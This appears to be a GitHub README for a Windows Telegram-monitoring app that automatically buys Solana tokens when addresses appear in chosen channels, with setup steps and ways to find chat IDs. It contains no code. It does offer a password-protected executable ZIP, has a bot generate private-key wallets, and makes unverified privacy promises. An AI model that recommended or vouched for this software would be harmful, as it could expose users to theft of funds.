# Ape4Me Agent

### Overview
Ape4Me Agent is a Windows application designed to seamlessly connect with your Telegram account. Its primary function is to monitor specified Solana and pump.fun token addresses within the groups and channels you configure. Upon detecting a token address, the application promptly sends a buy signal to our trade API, ensuring swift token acquisition.

### Key Features
Automated Monitoring: Effortlessly track token addresses in your chosen Telegram groups and channels.

Trade API Integration: Once a token address and wallet ID are identified, our API executes the purchase as quickly as possible.

Wallet Management: Generate up to three free wallets, complete with public and private keys. You can also specify the amount of SOL for token purchases when the API receives an address.

Privacy Assurance: The application does not share or access information about your channels and groups, maintaining your privacy even if they are private.

Local Processing: All Telegram monitoring logic operates on your PC, ensuring that only the token address and wallet ID are transmitted to our API, as provided by our Telegram bot.

### Security and Privacy
Your privacy is our priority. The application is designed to function without accessing or sharing any personal information about your Telegram groups and channels. All operations related to monitoring are conducted locally on your device.

### Getting Started
<a href="https://github.com/Ape4Me/ape4me-agent/blob/main/ape4me-agent-v11_w64.zip">Download</a> and Install: Download and extract ZIP archive to new Ape4Me Agent folder on your Windows PC. Archive password is "ape4me", use it when extracting.

Configure Your Settings: Specify the groups and channels you wish to monitor for token addresses.

Generate Wallets in <a href="https://t.me/@ape4mebot" target="_blank">@ape4mebot</a>: Create up to three wallets and manage your keys securely.

Set Purchase Parameters: Define the amount of SOL for token purchases.

Update config: Use your wallets ID from telegram bot in Agent filter settings, to set which wallet must buy tokens from which channel/group.

Start Monitoring: Launch app & let it handle the rest, ensuring timely token acquisitions.

### How to get Telegrams Channel/Group ID
#### Method 1 (Web A)
This is based on JayeshRocks’s question with some extra steps to make the ID work with Bot API.

Login to Telegram Web A.

Open the chat you want to get its ID.

Your browser’s address should look like https://web.telegram.org/a/#-1527776602.

Remove the scheme, the hostname and the path, keeping the anchor so your result looks like #-1527776602.

Replace “#-” so it looks like 1527776602.

#### Method 2 (Private Supergroups)
If the chat is a private channel/supergroup, you can do the following:

Copy a link of a message. (It will look like https://t.me/c/1527776602/1002.)

Remove the protocol and domain name, so it looks like c/1527776602/1002.

Remove the first and last path, so it looks like 1527776602.

### Contribution
We welcome contributions from the community. Feel free to fork the repository, make improvements, and submit pull requests.
